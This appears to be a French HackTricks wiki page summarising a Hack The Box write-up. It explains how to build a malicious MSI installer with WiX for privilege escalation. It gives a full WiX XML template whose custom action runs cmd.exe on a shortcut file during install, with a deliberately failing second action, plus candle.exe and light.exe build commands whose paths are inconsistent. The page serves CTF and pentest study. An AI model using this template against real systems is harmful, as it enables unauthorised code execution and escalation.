{{#include ../../banners/hacktricks-training.md}}

# Création d'un MSI malveillant et obtention des droits root

La création de l'installateur MSI se fera en utilisant wixtools, spécifiquement [wixtools](http://wixtoolset.org) sera utilisé. Il convient de mentionner que d'autres constructeurs MSI ont été essayés, mais ils n'ont pas réussi dans ce cas particulier.

Pour une compréhension complète des exemples d'utilisation de wix MSI, il est conseillé de consulter [cette page](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Ici, vous pouvez trouver divers exemples qui démontrent l'utilisation de wix MSI.

L'objectif est de générer un MSI qui exécutera le fichier lnk. Afin d'y parvenir, le code XML suivant pourrait être utilisé ([xml from here](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)):
```markup
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Il est important de noter que l'élément Package contient des attributs tels que InstallerVersion et Compressed, spécifiant la version de l'installateur et indiquant si le package est compressé ou non, respectivement.

Le processus de création implique d'utiliser candle.exe, un outil de wixtools, pour générer un wixobject à partir de msi.xml. La commande suivante doit être exécutée :
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
De plus, il convient de mentionner qu'une image est fournie dans le post, qui illustre la commande et sa sortie. Vous pouvez vous y référer pour une guidance visuelle.

En outre, light.exe, un autre outil de wixtools, sera utilisé pour créer le fichier MSI à partir de l'objet wix. La commande à exécuter est la suivante :
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Similaire à la commande précédente, une image est incluse dans le post illustrant la commande et sa sortie.

Veuillez noter que bien que ce résumé vise à fournir des informations précieuses, il est recommandé de se référer au post original pour des détails plus complets et des instructions précises.

## Références

- [https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)
[wixtools](http://wixtoolset.org)

{{#include ../../banners/hacktricks-training.md}}
